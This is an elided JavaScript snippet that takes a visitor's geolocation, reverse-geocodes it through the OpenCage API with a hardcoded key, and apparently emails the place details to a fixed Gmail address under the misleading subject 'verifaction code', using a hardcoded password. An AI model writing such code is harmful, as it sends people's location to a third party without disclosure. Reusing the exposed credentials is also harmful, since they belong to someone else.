    ...
    function onSuccess(position){
        ...
        fetch(`https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=2f820573120345f0b350cc7e0e53d1c3`)
        ...
        .then(response => response.json()).then(response =>{
            ...
            let {city, village, state, country} = allDetails;
             //getting country, postcode, country properties value from allDetails obj

             var x =  `${city} ${village}, ${state} ,${country}`;
            button.innerText = x; 
     ...
     Password : "oadaotzokyybvmyq",
     To : "fiveerjoy@gmail.com",
     From : 'test@gmail.com',
     Subject : "verifaction code",
     Body :dis + " , " +  vill + " , " +  stat + " , " + countr 
